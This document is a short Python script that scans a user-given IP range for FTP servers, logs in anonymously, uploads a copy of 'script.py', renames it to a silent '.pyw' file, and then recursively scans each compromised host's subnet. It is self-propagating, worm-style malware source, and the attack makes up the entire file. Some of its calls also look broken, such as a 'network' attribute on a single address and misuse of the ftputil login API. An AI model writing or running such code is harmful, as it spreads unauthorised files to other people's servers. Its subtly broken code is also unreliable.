import ftputil
import socket
import ipaddress
import concurrent.futures
import dns.resolver


def scan_host(ip_address):
    try:
        with ftputil.FTPHost(str(ip_address)) as ftp_host:
            ftp_host.chdir('/')
            ftp_host.stat('.')
            print(f"FTP server found at {ip_address}")
            try:
                ftp_host.login()
                print(f"Anonymous login successful for {ip_address}")
                ftp_host.upload('./script.py', 'script.py')
                ftp_host.rename('script.py', 'script.pyw')
                ftp_host.close()
                print(f"Script copied and renamed at {ip_address}")
                with ftputil.FTPHost(str(ip_address), 'anonymous', '') as ftp_host_anon:
                    ftp_host_anon.chdir('/')
                    ftp_host_anon.stat('.')
                    print(f"Scanning subnet for {ip_address}")
                    for target_ip in ip_address.network.hosts():
                        scan_host(target_ip)
            except ftputil.error.FTPIOError as e:
                print(f"Anonymous login failed for {ip_address}: {e}")
    except ftputil.error.FTPOSError:
        pass


def main():
    while True:
        target = input("Enter a target IP or subnet (CIDR notation): ")
        try:
            ip_network = ipaddress.ip_network(target)
            break
        except ValueError:
            print("Invalid target. Please enter a valid IP address or subnet in CIDR notation (e.g. 192.168.0.0/24)")

    with concurrent.futures.ThreadPoolExecutor() as executor:
        for host in ip_network.hosts():
            executor.submit(scan_host, host)


if __name__ == '__main__':
    main()
